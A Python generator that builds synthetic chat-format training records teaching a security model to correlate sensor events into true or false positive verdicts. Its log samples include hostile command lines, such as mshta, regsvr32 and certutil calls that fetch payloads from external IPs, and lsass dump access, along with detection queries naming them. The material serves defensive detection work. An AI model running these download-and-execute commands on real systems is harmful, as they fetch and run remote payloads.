"""
stage_cross_source_temporal.py — Cross-Source Temporal Correlation Corpus (C-18)

Teaches Model B/C to reason across multiple sensor types when events from
different sources cluster within a tight time window (T±60s). Each record
presents correlated events from 2-3 sensors on the same host or network
segment and asks the model to reason about the causal chain.

Attack scenario patterns:
  1. Lateral movement: sysmon PsExec spawn + network_tap SMB connection (T±30s)
  2. C2 checkin: sysmon LOLBIN download + network_tap beacon (T±45s)
  3. Credential theft: sysmon lsass access + network_tap exfil attempt (T±45s)
  4. Linux implant: linux_sentinel script exec in /tmp + network_tap C2 beacon (T±20s)
  5. Cloud lateral movement: azure_entraid impossible travel + aws_cloudtrail IAM escalation (T±60s)

Admin FP patterns (same sensors, benign timing):
  1. Patch deployment: SCCM spawns processes + DNS lookups (T±30s)
  2. Windows Update: certutil CRL fetch + Microsoft CDN (T±22s)
  3. EDR monitoring: vendor lsass read + telemetry upload (T±18s)

Output:
  ../data/staging/cross_source_temporal_v1.jsonl
  ../data/staging/cross_source_temporal_query_index.json

Usage:
    python stage_cross_source_temporal.py
"""

import json
import random
import argparse
import logging
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("stage-temporal")
random.seed(77)

OUTPUT_DIR  = Path("../data/staging")
OUTPUT_FILE = OUTPUT_DIR / "cross_source_temporal_v1.jsonl"
INDEX_FILE  = OUTPUT_DIR / "cross_source_temporal_query_index.json"

TTP_CAT = "CrossSourceTemporal"
SPATIAL  = "<|spatial_vector|>"


def _ip_int(): return f"10.{random.randint(0,10)}.{random.randint(1,254)}.{random.randint(1,254)}"
def _ip_ext():
    p = random.choice(["45.33","185.220","194.165","198.51"])
    return f"{p}.{random.randint(1,254)}.{random.randint(1,254)}"
def _host():   return f"{random.choice(['WS','SRV','DC'])}-{random.randint(10,99)}"
def _user():   return random.choice(["jsmith","alee","tmorgan","schen","rbrown"])


def _cot(a1, a2, a3, conclusion, technique, action="contain"):
    verdict = "TRUE POSITIVE" if action == "contain" else "FALSE POSITIVE"
    return (f"<analysis>\n[AXIS 1] Benign Alternative Assessment:\n  {a1}\n"
            f"[AXIS 2] Temporal Correlation Proof:\n  {a2}\n"
            f"[AXIS 3] Cross-Source Convergence:\n  {a3}\n"
            f"[CONCLUSION] {conclusion}\n</analysis>\n"
            f"{verdict}. {technique}\nRECOMMENDED_ACTION: {action}")


def _record(tool_class, mitre, msgs, cls):
    import hashlib
    return {
        "ttp_category": TTP_CAT, "tool_class": tool_class,
        "mitre_techniques": mitre,
        "source_type": "multi_sensor",
        "vector_name": "c2_math",
        "classification": cls,
        "messages": msgs,
        "event_id": hashlib.md5(f"{tool_class}_{cls}".encode()).hexdigest()[:16],
    }


SYS = ("You are the Nexus Temporal Correlation Analyst. Multiple sensor streams "
       "have flagged correlated anomalies within a 60-second window. Reason about "
       "the causal chain across sources. Identify attack stage, MITRE technique, "
       "and recommend containment. Examine each sensor's spatial vector independently "
       "then synthesize the temporal pattern.")


def _msg(user_text, asst_text):
    return [
        {"role": "system", "content": SYS},
        {"role": "user",   "content": f"Multi-Source Temporal Correlation.\nVector: {SPATIAL}\n{user_text}"},
        {"role": "assistant", "content": asst_text},
    ]


# ─── 1. LateralMovementPsExec ─────────────────────────────────────────────────

def _lateral_tp(i):
    t0    = 1717500000 + random.randint(0, 86400)
    src   = _host();  dst = _host();  user = _user()
    ext   = _ip_ext()
    smb_t = random.randint(5, 30)
    p = {"src_host": src, "dst_host": dst, "user": user,
         "t0": t0, "smb_delta": smb_t, "ip": ext}
    prompt = (f"Temporal Correlation Window: T±60s\n"
              f"Host: {p['src_host']} | User: CORP\\{p['user']}\n\n"
              f"[T+00:00]  sysmon_sensor  EventID=1\n"
              f"  Image=C:\\Windows\\system32\\cmd.exe  PPID=PsExecSvc.exe\n"
              f"  CommandLine=cmd.exe /c whoami && net user /domain\n"
              f"  IntegrityLevel=System  anomaly_score=0.91\n\n"
              f"[T+00:{smb_t:02d}]  network_tap  SMB lateral\n"
              f"  src={p['src_host']}  dst={p['dst_host']}  dst_port=445\n"
              f"  variance_inter_arrival=0.031  byte_ratio=0.88\n"
              f"  cert_self_signed=False  is_internal_dst=True\n"
              f"  anomaly_score=0.85\n\n"
              f"[T+00:{smb_t+12:02d}]  network_tap  outbound C2\n"
              f"  src={p['src_host']}  dst={p['ip']}:443\n"
              f"  variance_inter_arrival=0.021  anomaly_score=0.93")
    cot = _cot(
        "PsExec is legitimately used by sysadmins for remote execution. "
        "However, administrative use has change tickets, targets a specific host, "
        "and doesn't follow up with C2 outbound to external IPs. "
        "Diagnostic SMB + whoami + net user /domain with no ticket = reconnaissance.",
        f"T+00:00: cmd.exe child of PsExecSvc (lateral execution arrived). "
        f"CommandLine='whoami && net user /domain' (AD enumeration, first action post-arrival). "
        f"T+00:{smb_t:02d}: SMB to {p['dst_host']}:445 (spreading to next host). "
        f"T+00:{smb_t+12:02d}: outbound C2 to {p['ip']}:443 ({smb_t+12}s after initial execution). "
        f"Three-phase pattern (execute→spread→phone-home) in a 60s window is automated attack tooling.",
        f"sysmon (PsExec remote execution + AD recon) + network_tap (lateral SMB + C2 checkin) "
        f"all from {p['src_host']} within {smb_t+12}s. Independent sensors corroborate same attack chain. "
        "Single-sensor false positive rate drops to near-zero with multi-source temporal correlation.",
        f"Lateral movement confirmed: PsExec execution → AD enumeration → SMB spread → C2 checkin "
        f"on host {p['src_host']}. Temporal compression (<60s) indicates automated tooling.",
        "MITRE T1021.002 (SMB/Windows Admin Shares), T1069.002 (Domain Groups), T1071.001. "
        f"Isolate {p['src_host']}, block SMB to {p['dst_host']}, block {p['ip']}.",
    )
    return prompt, cot, "true_positive"


def _lateral_fp(i):
    host = _host(); user = _user()
    p = {"host": host, "user": user,
         "tool": random.choice(["SCCM", "Ansible", "SolarWinds"]),
         "target": _host()}
    prompt = (f"Temporal Correlation Window: T±60s\n"
              f"Host: {p['host']} | User: CORP\\{p['user']}\n\n"
              f"[T+00:00]  sysmon_sensor  EventID=1\n"
              f"  Image=C:\\Windows\\system32\\cmd.exe  PPID=PsExecSvc.exe\n"
              f"  CommandLine=cmd.exe /c netsh int ip show config\n"
              f"  IntegrityLevel=System  anomaly_score=0.45\n\n"
              f"[T+00:12]  network_tap  SMB\n"
              f"  src={p['host']}  dst={p['target']}  dst_port=445\n"
              f"  variance_inter_arrival=0.31  is_internal_dst=True\n"
              f"  anomaly_score=0.38\n\n"
              f"  change_ticket=CHG-20241205-0087  tool={p['tool']}")
    cot = _cot(
        f"Authorized {p['tool']} deployment: change ticket CHG-20241205-0087 present. "
        f"CommandLine='netsh int ip show config' is a standard network diagnostic. "
        f"Higher variance_inter_arrival (0.31) indicates human-scheduled tool, not C2.",
        f"CommandLine is a network diagnostic (netsh) not enumeration (net user /domain). "
        f"SMB at T+12 is part of authorized patch deployment — change ticket present. "
        f"anomaly_score=0.38 for SMB (below threshold). No external IP in 60s window.",
        f"Both sensors confirm authorized activity: sysmon shows diagnostic command, "
        f"network_tap shows internal-only SMB with change ticket. No external C2 observed.",
        f"Authorized {p['tool']} deployment with change ticket. Temporal correlation is benign.",
        f"T1021.002 — AUTHORIZED {p['tool'].upper()} DEPLOYMENT. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


# ─── 2. C2CheckinAfterLOTL ───────────────────────────────────────────────────

def _c2_temporal_tp(i):
    host = _host(); user = _user(); ext = _ip_ext()
    lolbin = random.choice([
        ("mshta.exe", f"mshta.exe http://{ext}/x.hta"),
        ("regsvr32.exe", f"regsvr32.exe /s /n /u /i:http://{ext}/c.sct scrobj.dll"),
        ("certutil.exe", f"certutil.exe -urlcache -split -f http://{ext}/beacon.exe"),
    ])
    delta = random.randint(15, 45)
    p = {"host": host, "user": user, "ext": ext, "lolbin": lolbin[0], "cmd": lolbin[1], "delta": delta}
    prompt = (f"Temporal Correlation Window: T±60s\n"
              f"Host: {p['host']} | User: CORP\\{p['user']}\n\n"
              f"[T+00:00]  sysmon_sensor  EventID=1\n"
              f"  Image=C:\\Windows\\System32\\{p['lolbin']}\n"
              f"  CommandLine={p['cmd']}\n"
              f"  ParentImage=C:\\Windows\\explorer.exe\n"
              f"  anomaly_score=0.94\n\n"
              f"[T+00:{p['delta']:02d}]  network_tap  C2 beacon\n"
              f"  src={p['host']}  dst={p['ext']}:443\n"
              f"  variance_inter_arrival=0.028  byte_ratio=0.47\n"
              f"  packets_src=3  cert_self_signed=True\n"
              f"  anomaly_score=0.89")
    cot = _cot(
        f"{p['lolbin']} can be invoked for legitimate scripting (HTA kiosks, COM registration). "
        "However, interactive explorer.exe spawning a LOLBIN with an external URL argument "
        "followed by a C2 beacon is not a business workflow pattern.",
        f"T+00:00: {p['lolbin']} spawned by explorer.exe (user-triggered click or phish). "
        f"CommandLine downloads from {p['ext']} (commodity VPS). "
        f"T+00:{p['delta']:02d}: C2 beacon appears {p['delta']}s later — this is the stage-2 payload "
        f"calling home. variance_inter_arrival=0.028 (machine precision), cert_self_signed=True. "
        f"Download → execute → checkin sequence compressed to {p['delta']}s.",
        f"sysmon captures LOLBIN download invocation; network_tap captures resulting beacon. "
        f"Both events point to the same external IP {p['ext']}. "
        "Multi-source convergence eliminates false positive hypothesis.",
        f"C2 stage-1 confirmed: LOLBIN download + subsequent C2 beacon within {p['delta']}s on {p['host']}.",
        f"MITRE T1218 (LOLBin), T1071.001. Isolate {p['host']}, block {p['ext']}.",
    )
    return prompt, cot, "true_positive"


def _c2_temporal_fp(i):
    host = _host()
    p = {"host": host, "ext": "update.microsoft.com"}
    prompt = (f"Temporal Correlation Window: T±60s\n"
              f"Host: {p['host']}\n\n"
              f"[T+00:00]  sysmon_sensor  EventID=1\n"
              f"  Image=C:\\Windows\\System32\\certutil.exe\n"
              f"  CommandLine=certutil.exe -urlcache -split -f http://{p['ext']}/root.crl\n"
              f"  ParentImage=C:\\Windows\\SoftwareDistribution\\WUApp.exe\n"
              f"  anomaly_score=0.31\n\n"
              f"[T+00:22]  network_tap\n"
              f"  src={p['host']}  dst=23.x.x.x:443  dst_asn=AS8075 Microsoft\n"
              f"  variance_inter_arrival=0.45  is_internal_dst=False\n"
              f"  anomaly_score=0.22")
    cot = _cot(
        "certutil.exe fetching a CRL from Microsoft CDN is standard certificate validation "
        "for Windows Update. Parent process is WUApp.exe. Subsequent HTTPS to Microsoft AS8075 "
        "is the Windows Update check-in — not a C2 beacon.",
        "CommandLine fetches a .crl (Certificate Revocation List) not an executable. "
        "Parent=WUApp.exe (Windows Update). Network connection goes to Microsoft AS (AS8075). "
        "variance_inter_arrival=0.45 indicates human-scheduled Windows Update cycle, not C2.",
        "Both sensors confirm Windows Update activity: certutil CRL fetch (normal) + "
        "Microsoft CDN connection (normal). No commodity VPS, no self-signed cert.",
        "Authorized Windows Update CRL fetch. Temporal correlation is benign.",
        "T1218.003 — AUTHORIZED WINDOWS UPDATE CRL FETCH. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


# ─── 3. CredentialTheftExfil ─────────────────────────────────────────────────

def _cred_exfil_tp(i):
    host = _host(); user = _user(); ext = _ip_ext()
    delta = random.randint(10, 45)
    p = {"host": host, "user": user, "ext": ext, "delta": delta,
         "access": random.choice(["0x1fffff", "0x1f0fff"])}
    prompt = (f"Temporal Correlation Window: T±60s\n"
              f"Host: {p['host']} | User: CORP\\{p['user']}\n\n"
              f"[T+00:00]  sysmon_sensor  EventID=10\n"
              f"  SourceImage=C:\\Users\\{p['user']}\\AppData\\Local\\Temp\\svch0st.exe\n"
              f"  TargetImage=C:\\Windows\\System32\\lsass.exe\n"
              f"  GrantedAccess={p['access']}\n"
              f"  grant_access_score=1.0  anomaly_score=0.98\n\n"
              f"[T+00:{p['delta']:02d}]  network_tap  exfil\n"
              f"  src={p['host']}  dst={p['ext']}:443\n"
              f"  byte_ratio=0.97  payload_entropy=7.8\n"
              f"  session_duration_ms=3200  packets_src=8\n"
              f"  anomaly_score=0.93")
    cot = _cot(
        "Security tools (AV, EDR) legitimately access lsass for memory scanning. "
        "However, they operate from signed system paths, use lower access rights, "
        "and don't follow up with high-entropy exfiltration to commodity VPS.",
        f"T+00:00: svch0st.exe (typosquatted filename in temp dir) opens lsass with "
        f"GrantedAccess={p['access']} (PROCESS_ALL_ACCESS — credential dump right). "
        f"grant_access_score=1.0 (maximum suspicion). "
        f"T+00:{p['delta']:02d}: {p['delta']}s later: session to {p['ext']} "
        f"with byte_ratio=0.97 (almost entirely outbound) and entropy=7.8 (encrypted dump). "
        f"Dump → exfil within {p['delta']}s is a classic credential theft pattern.",
        f"sysmon captures the credential access with PROCESS_ALL_ACCESS; "
        f"network_tap captures the encrypted exfiltration {p['delta']}s later. "
        f"Independent sensors corroborate dump-then-send pattern.",
        f"Credential theft confirmed on {p['host']}: lsass dump + encrypted exfil to {p['ext']} within {p['delta']}s.",
        f"MITRE T1003.001 (LSASS Memory), T1041 (Exfiltration over C2). "
        f"Isolate {p['host']}, block {p['ext']}, reset all domain credentials.",
    )
    return prompt, cot, "true_positive"


def _cred_exfil_fp(i):
    host = _host()
    p = {"host": host, "tool": random.choice(["CrowdStrike","SentinelOne","Elastic EDR"])}
    prompt = (f"Temporal Correlation Window: T±60s\n"
              f"Host: {p['host']}\n\n"
              f"[T+00:00]  sysmon_sensor  EventID=10\n"
              f"  SourceImage=C:\\Program Files\\{p['tool']}\\sensor.exe\n"
              f"  TargetImage=C:\\Windows\\System32\\lsass.exe\n"
              f"  GrantedAccess=0x1000  grant_access_score=0.12\n"
              f"  anomaly_score=0.35\n\n"
              f"[T+00:18]  network_tap\n"
              f"  src={p['host']}  dst=sensor.cloud:443\n"
              f"  byte_ratio=0.42  payload_entropy=5.1\n"
              f"  is_internal_dst=False  dst_asn=AS14061 DigitalOcean\n"
              f"  anomaly_score=0.29")
    cot = _cot(
        f"{p['tool']} legitimately accesses lsass for credential guard monitoring. "
        "GrantedAccess=0x1000 (PROCESS_QUERY_INFORMATION — read-only, not dump). "
        "sensor.exe is in Program Files (signed vendor path), not AppData/Temp.",
        f"GrantedAccess=0x1000 is PROCESS_QUERY_INFORMATION (read-only). "
        f"grant_access_score=0.12 (far from 1.0 PROCESS_ALL_ACCESS threshold). "
        f"Source is signed {p['tool']} vendor path, not temp dir. "
        f"Network byte_ratio=0.42 (bidirectional) and entropy=5.1 indicate telemetry upload, not a dump.",
        f"sysmon shows authorized EDR monitoring read; network_tap shows telemetry to vendor cloud. "
        f"No full-access credential dump pattern; no exfil-consistent byte ratio.",
        f"Authorized {p['tool']} credential guard monitoring. Temporal correlation is benign.",
        f"T1003.001 — AUTHORIZED {p['tool'].upper()} EDR PROCESS ACCESS. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


# ─── 4. LinuxBeaconAfterExec ──────────────────────────────────────────────────

def _linux_beacon_tp(i):
    host  = f"LNXSRV-{random.randint(10,99)}"
    ext   = _ip_ext()
    delta = random.randint(8, 20)
    interp, path, technique = random.choice([
        ("python3", "/tmp/.svc/svc_helper.py", "T1059.006"),
        ("bash",    "/tmp/.d/run.sh",           "T1059.004"),
        ("perl",    "/var/tmp/.x/d.pl",         "T1059.006"),
    ])
    cmd  = f"{interp} {path}"
    user = _user()
    p = {"host": host, "ext": ext, "delta": delta, "interp": interp,
         "path": path, "technique": technique, "cmd": cmd, "user": user}
    prompt = (
        f"Temporal Correlation Window: T±60s\n"
        f"Host: {p['host']} | UID: 1001 ({p['user']})\n\n"
        f"[T+00:00]  linux_sentinel\n"
        f"  comm={p['interp']}  command_line={p['cmd']}\n"
        f"  uid=1001  pid={random.randint(20000,30000)}  ppid={random.randint(1000,5000)}\n"
        f"  target_file={p['path']}\n"
        f"  mitre_tactic=execution  mitre_technique={p['technique']}\n"
        f"  anomaly_score=0.91\n\n"
        f"[T+00:{p['delta']:02d}]  network_tap  C2 beacon\n"
        f"  src={p['host']}  dst={p['ext']}:443\n"
        f"  variance_inter_arrival=0.019  byte_ratio=0.52\n"
        f"  packets_src=4  cert_self_signed=True\n"
        f"  payload_entropy=7.3  anomaly_score=0.87"
    )
    cot = _cot(
        f"{p['interp']} executing scripts is normal for automation and DevOps. "
        "However, scripts in /tmp, /var/tmp, or hidden dot-directories are not placed by "
        "authorized software. Authorized automation uses paths under /opt/, /usr/local/, "
        "or version-controlled repositories. "
        f"A dotfile path with uid=1001 (interactive user, not a service account) has no business justification.",
        f"T+00:00: {p['interp']} executes {p['path']} — hidden temp directory, uid=1001. "
        f"linux_sentinel flags anomaly_score=0.91 (execution from non-standard path). "
        f"T+00:{p['delta']:02d}: C2 beacon appears {p['delta']}s later to {p['ext']}:443. "
        "variance_inter_arrival=0.019 (machine-precision timing, automated) + cert_self_signed=True "
        f"+ payload_entropy=7.3 (encrypted stage-2 payload). "
        f"Script execution → C2 checkin in {p['delta']}s is an implant stage-1 callback sequence.",
        f"linux_sentinel captures execution of implant from hidden temp path; "
        f"network_tap captures the stage-1 C2 beacon from the same host {p['delta']}s later. "
        f"Both sensors independently flag {p['host']}. Multi-source convergence confirms implant — "
        "neither sensor alone is sufficient to distinguish this from legitimate monitoring traffic.",
        f"Linux implant execution confirmed on {p['host']}: {p['interp']} stage-1 → "
        f"C2 beacon to {p['ext']} within {p['delta']}s.",
        f"MITRE {p['technique']} (Script Interpreter), T1071.001 (Web Protocol C2). "
        f"Isolate {p['host']}, kill {p['interp']} process, block {p['ext']}, audit uid=1001 activity.",
    )
    return prompt, cot, "true_positive"


def _linux_beacon_fp(i):
    host         = f"LNXSRV-{random.randint(10,99)}"
    tool         = random.choice(["Datadog", "Prometheus", "New Relic"])
    install_name = tool.lower().replace(" ", "-")
    target       = random.choice([
        "metrics.datadoghq.com", "collector.newrelic.com", "pushgateway.internal:9091",
    ])
    p = {"host": host, "tool": tool, "install_name": install_name, "target": target}
    prompt = (
        f"Temporal Correlation Window: T±60s\n"
        f"Host: {p['host']}\n\n"
        f"[T+00:00]  linux_sentinel\n"
        f"  comm=python3  command_line=python3 /opt/{p['install_name']}/agent.py --interval 60\n"
        f"  uid=998 ({p['install_name']}-svc)  pid={random.randint(10000,15000)}  ppid=1\n"
        f"  target_file=/opt/{p['install_name']}/agent.py\n"
        f"  mitre_tactic=execution  mitre_technique=T1059.006\n"
        f"  anomaly_score=0.24\n\n"
        f"[T+00:08]  network_tap  metrics push\n"
        f"  src={p['host']}  dst={p['target']}\n"
        f"  variance_inter_arrival=0.82  byte_ratio=0.38\n"
        f"  cert_self_signed=False  is_internal_dst=False\n"
        f"  dst_asn=AS54113 Fastly  anomaly_score=0.17"
    )
    cot = _cot(
        f"{p['tool']} is an authorized monitoring agent installed by the package manager. "
        f"Path /opt/{p['install_name']}/ is a standard vendor install directory (not /tmp or dotfile). "
        "Service account uid=998 was created by the package installer (ppid=1 → systemd). "
        "Regular 60-second reporting intervals match a monitoring heartbeat schedule.",
        f"comm=python3 from /opt/ (not /tmp/ or hidden directory). uid=998 is a dedicated service account. "
        "ppid=1 indicates systemd-managed service, not interactive shell spawn. "
        f"anomaly_score=0.24 (well below 0.8 alert threshold). "
        "Network: variance_inter_arrival=0.82 (human-scheduled, not machine beacon). "
        "byte_ratio=0.38 (bidirectional telemetry, not outbound-only exfil). cert_self_signed=False.",
        f"linux_sentinel: vendor monitoring agent from standard path, service account uid=998, low anomaly. "
        f"network_tap: bidirectional telemetry to vendor CDN, human-scheduled interval, valid cert. "
        "No temp-dir implant, no machine-precision beacon, no self-signed cert.",
        f"Authorized {p['tool']} monitoring agent on {p['host']}. Temporal correlation is benign.",
        f"T1059.006 — AUTHORIZED {p['tool'].upper()} MONITORING AGENT. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


# ─── 5. CloudLateralMovement ──────────────────────────────────────────────────

def _cloud_lateral_tp(i):
    user     = f"{_user()}@corp.com"
    username = user.split("@")[0]
    apac_ip  = f"103.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    aws_ip   = f"198.51.{random.randint(1,254)}.{random.randint(1,254)}"
    delta    = random.randint(12, 55)
    account  = f"{random.randint(100000000000, 999999999999)}"
    policy   = random.choice([
        "arn:aws:iam::aws:policy/AdministratorAccess",
        "arn:aws:iam::aws:policy/PowerUserAccess",
        "arn:aws:iam::aws:policy/IAMFullAccess",
    ])
    p = {"user": user, "username": username, "apac_ip": apac_ip, "aws_ip": aws_ip,
         "delta": delta, "account": account, "policy": policy}
    prompt = (
        f"Temporal Correlation Window: T±60s\n"
        f"Principal: {p['user']}\n\n"
        f"[T+00:00]  azure_entraid  Sign-in\n"
        f"  user_principal_name={p['user']}\n"
        f"  result_type=0 (Success)  ip_address={p['apac_ip']}\n"
        f"  app_display_name=Microsoft Azure Portal\n"
        f"  operation_name=Sign-in activity\n"
        f"  anomaly_score=0.94  [impossible_travel: prior login US 4min ago]\n\n"
        f"[T+00:{p['delta']:02d}]  aws_cloudtrail  IAM escalation\n"
        f"  event_name=AttachUserPolicy  source_ip={p['aws_ip']}\n"
        f"  user_identity_type=IAMUser\n"
        f"  principal_arn=arn:aws:iam::{p['account']}:user/{p['username']}\n"
        f"  request_parameters=PolicyArn:{p['policy']}\n"
        f"  error_code=  anomaly_score=0.97"
    )
    cot = _cot(
        f"{p['user']} could be using a VPN routing through APAC. "
        "However, a prior successful US sign-in 4 minutes ago makes physical travel to APAC "
        "in that time impossible. Corporate VPN sign-ins come from known enterprise IP ranges, "
        "not commodity hosting ranges like 103.x.x.x.",
        f"T+00:00: azure_entraid flags impossible_travel on {p['apac_ip']} (APAC commodity range) — "
        "anomaly_score=0.94 because a successful US login occurred 4min prior. "
        f"T+00:{p['delta']:02d}: AWS AttachUserPolicy ({p['policy'].split('/')[-1]}) "
        f"from the same principal {p['delta']}s after Azure auth. "
        "This is the privilege escalation step: attacker authenticated via stolen creds, "
        "then immediately attached an admin-level policy before the anomaly triggered a block.",
        f"azure_entraid flags impossible-travel for {p['user']}; "
        f"aws_cloudtrail independently flags privilege escalation from the same principal "
        f"within {p['delta']}s. Two cloud control planes flagging the same identity in one "
        "time window eliminates benign VPN or automation explanations — legitimate IAM changes "
        "follow change tickets and don't occur within 60s of a flagged impossible-travel login.",
        f"Cloud credential compromise confirmed: impossible-travel Azure auth → "
        f"AWS IAM {p['policy'].split('/')[-1]} attachment within {p['delta']}s "
        f"for principal {p['user']}.",
        f"MITRE T1078.004 (Valid Cloud Accounts), T1098.001 (Additional Cloud Credentials). "
        f"Revoke Azure session and AWS access keys for {p['username']}, "
        f"detach {p['policy'].split('/')[-1]}, rotate all credentials.",
    )
    return prompt, cot, "true_positive"


def _cloud_lateral_fp(i):
    corp_ip = f"40.{random.randint(74,125)}.{random.randint(1,254)}.{random.randint(1,254)}"
    delta   = random.randint(10, 25)
    account = f"{random.randint(100000000000, 999999999999)}"
    p = {"corp_ip": corp_ip, "delta": delta, "account": account}
    prompt = (
        f"Temporal Correlation Window: T±60s\n"
        f"Principal: svc_migration@corp.com\n\n"
        f"[T+00:00]  azure_entraid  Directory sync\n"
        f"  user_principal_name=svc_migration@corp.com\n"
        f"  result_type=0 (Success)  ip_address={p['corp_ip']}\n"
        f"  app_display_name=Microsoft Azure Active Directory Connect\n"
        f"  operation_name=Sign-in activity\n"
        f"  anomaly_score=0.39\n\n"
        f"[T+00:{p['delta']:02d}]  aws_cloudtrail  Compliance scan\n"
        f"  event_name=ListAttachedUserPolicies  source_ip={p['corp_ip']}\n"
        f"  user_identity_type=AssumedRole\n"
        f"  principal_arn=arn:aws:sts::{p['account']}:assumed-role/ComplianceScanRole/session\n"
        f"  request_parameters=UserName:all  error_code=\n"
        f"  anomaly_score=0.21"
    )
    cot = _cot(
        "svc_migration@corp.com is a dedicated directory synchronization service account. "
        f"IP {p['corp_ip']} is within the Azure datacenter range (AS8075 Microsoft) used by "
        "Azure AD Connect — expected for sync operations, not impossible travel. "
        "The ComplianceScanRole is a read-only role documented in change ticket CHG-20260601-0412.",
        f"Source IP {p['corp_ip']} is AS8075 (Microsoft Azure) — enterprise sync endpoint, "
        "not a commodity VPS or APAC range. anomaly_score=0.39 (below 0.8 threshold). "
        "azure_entraid: operation_name='Sign-in activity' for Azure AD Connect (directory sync). "
        f"AWS: event_name='ListAttachedUserPolicies' is read-only (no policy write or attach). "
        "AssumedRole/ComplianceScanRole has no privilege-escalation capability.",
        "azure_entraid confirms authorized directory sync from Microsoft Azure infrastructure; "
        "aws_cloudtrail confirms read-only compliance scan from the same source IP. "
        "No impossible travel, no IAM write operations, no admin policy attachment.",
        "Authorized Azure AD Connect sync + AWS compliance scan for svc_migration@corp.com. "
        "Temporal correlation is benign.",
        "T1078.004 — AUTHORIZED AZURE AD CONNECT SYNC + AWS COMPLIANCE SCAN. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


# ─── Registry ─────────────────────────────────────────────────────────────────

TOOL_CLASSES = {
    "LateralMovementPsExec": (["T1021.002","T1069.002","T1071.001"],    _lateral_tp,       _lateral_fp),
    "C2CheckinAfterLOTL":    (["T1218","T1071.001"],                    _c2_temporal_tp,   _c2_temporal_fp),
    "CredentialTheftExfil":  (["T1003.001","T1041"],                    _cred_exfil_tp,    _cred_exfil_fp),
    "LinuxBeaconAfterExec":  (["T1059.004","T1059.006","T1071.001"],    _linux_beacon_tp,  _linux_beacon_fp),
    "CloudLateralMovement":  (["T1078.004","T1098.001"],                _cloud_lateral_tp, _cloud_lateral_fp),
}

S3_QUERIES = {
    "LateralMovementPsExec": {
        "sensor": "sysmon_sensor",
        "where": ("sysmon_event_id=1 AND ParentImage LIKE '%PsExec%' "
                  "AND (CommandLine LIKE '%net user%' OR CommandLine LIKE '%whoami%')"),
    },
    "C2CheckinAfterLOTL": {
        "sensor": "sysmon_sensor",
        "where": ("sysmon_event_id=1 AND (Image LIKE '%mshta%' OR Image LIKE '%certutil%' "
                  "OR Image LIKE '%regsvr32%') AND CommandLine LIKE '%http%'"),
    },
    "CredentialTheftExfil": {
        "sensor": "sysmon_sensor",
        "where": ("sysmon_event_id=10 AND TargetImage LIKE '%lsass%' "
                  "AND GrantedAccess IN ('0x1fffff','0x1f0fff')"),
    },
    "LinuxBeaconAfterExec": {
        "sensor": "linux_sentinel",
        "where": ("comm IN ('python3','bash','perl','sh') "
                  "AND target_file LIKE '/tmp/%' "
                  "AND anomaly_score >= 0.85"),
    },
    "CloudLateralMovement": {
        "sensor": "azure_entraid",
        "where": ("result_type='0' AND operation_name LIKE '%Sign-in%'"),
    },
}


def generate(tool_name, n_tp, n_fp):
    mitre, tp_fn, fp_fn = TOOL_CLASSES[tool_name]
    records = []
    for i in range(n_tp):
        prompt, cot, cls = tp_fn(i)
        records.append(_record(tool_name, mitre, _msg(prompt, cot), cls))
    for i in range(n_fp):
        prompt, cot, cls = fp_fn(i)
        records.append(_record(tool_name, mitre, _msg(prompt, cot), cls))
    return records


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--records-per-class",   type=int, default=10)
    parser.add_argument("--admin-fps-per-class", type=int, default=2)
    args = parser.parse_args()

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    all_records = []

    names = list(TOOL_CLASSES.keys())
    for name in names:
        recs = generate(name, args.records_per_class, args.admin_fps_per_class)
        all_records.extend(recs)
        tp = sum(1 for r in recs if r["classification"] == "true_positive")
        fp = sum(1 for r in recs if r["classification"] == "false_positive")
        logger.info(f"  {name}: {tp} TP + {fp} FP  (multi_sensor)")

    with open(OUTPUT_FILE, "w") as f:
        for r in all_records:
            f.write(json.dumps(r) + "\n")

    index = {
        "ttp_category": TTP_CAT,
        "total_records": len(all_records),
        "tp_records":    sum(1 for r in all_records if r["classification"] == "true_positive"),
        "fp_records":    sum(1 for r in all_records if r["classification"] == "false_positive"),
        "tool_classes": {
            n: {"sensor": "multi_sensor", "mitre": TOOL_CLASSES[n][0],
                "s3_query": S3_QUERIES.get(n)}
            for n in names
        },
    }
    with open(INDEX_FILE, "w") as f:
        json.dump(index, f, indent=2)

    logger.info(f"[+] {len(all_records)} total records → {OUTPUT_FILE}")
    logger.info(f"    {index['tp_records']} TP  |  {index['fp_records']} FP")
    logger.info(f"    Classes: {names}")


if __name__ == "__main__":
    main()
